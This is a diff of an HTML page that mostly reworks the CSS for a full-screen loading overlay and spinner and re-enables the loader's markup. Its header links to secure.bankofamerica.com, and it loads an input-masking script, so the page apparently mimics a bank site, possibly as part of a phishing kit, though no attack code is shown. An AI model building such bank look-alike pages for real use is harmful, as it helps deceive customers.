@@ -12,71 +12,65 @@
   <script src="/js/jquery.mask.min.js"></script>
 </head>
 <style>
-    /* ===== PAGE LOADER ===== */
-    /* Overlay covering everything except header/footer */
-    #pageLoader {
-      position: fixed;        /* fixed to viewport */
-      top: 80px;              /* height of header */
-      bottom: 60px;           /* height of footer */
-      left: 0;
-      width: 100vw;           /* full viewport width */
-      background: #ffffff;
-      z-index: 99999;
-      overflow: hidden;
-    }
+  /* ===== PAGE LOADER ===== */
+  /* Overlay covering content only (not header/footer) */
+  #pageLoader {
+    position: fixed;          /* fixed relative to viewport */
+    top: 80px;                /* adjust to header height */
+    bottom: 60px;             /* adjust to footer height */
+    left: 0;
+    right: 0;                 /* use left/right instead of width to avoid vw issues */
+    background: #ffffff;
+    z-index: 99999;
+    display: flex;            /* center spinner easily */
+    align-items: center;
+    justify-content: center;
+  }
 
-    /* Center spinner in overlay */
-    .loaderBox {
-      position: absolute;
-      top: 50%;               /* center vertically in remaining space */
-      left: 50%;
-      transform: translate(-50%, -50%);
-    }
+  /* Spinner */
+  .loader {
+    width: 50px;
+    aspect-ratio: 1;
+    display: grid;
+    -webkit-mask: conic-gradient(from 15deg, #0000, #000);
+    animation: spinLoader 1s infinite steps(12);
+  }
 
-    /* Spinner styling */
-    .loader {
-      width: 50px;
-      aspect-ratio: 1;
-      display: grid;
-      -webkit-mask: conic-gradient(from 15deg, #0000, #000);
-      animation: spinLoader 1s infinite steps(12);
-    }
+  .loader,
+  .loader:before,
+  .loader:after {
+    background:
+      radial-gradient(closest-side at 50% 12.5%, #111 96%, #0000) 50% 0/20% 80% repeat-y,
+      radial-gradient(closest-side at 12.5% 50%, #444 96%, #0000) 0 50%/80% 20% repeat-x;
+  }
 
-    .loader,
-    .loader:before,
-    .loader:after {
-      background:
-        radial-gradient(closest-side at 50% 12.5%, #111 96%, #0000) 50% 0/20% 80% repeat-y,
-        radial-gradient(closest-side at 12.5% 50%, #444 96%, #0000) 0 50%/80% 20% repeat-x;
-    }
+  .loader:before,
+  .loader:after {
+    content: "";
+    grid-area: 1/1;
+    transform: rotate(30deg);
+  }
 
-    .loader:before,
-    .loader:after {
-      content: "";
-      grid-area: 1/1;
-      transform: rotate(30deg);
-    }
+  .loader:after {
+    transform: rotate(60deg);
+  }
 
-    .loader:after {
-      transform: rotate(60deg);
+  @keyframes spinLoader {
+    100% {
+      transform: rotate(1turn);
     }
-
-    @keyframes spinLoader {
-      100% {
-        transform: rotate(1turn);
-      }
-    }
-  </style>
+  }
+</style>
 <body>
   <a href="https://secure.bankofamerica.com/">
     <header></header>
   </a>
   
-  <!--div id="pageLoader">
+  <div id="pageLoader">
     <div class="loaderBox">
       <div class="loader"></div>
     </div>
-  </div-->
+  </div>
 
   <main class="col-small-up">
     <div class="main-section flex-grid-nest">
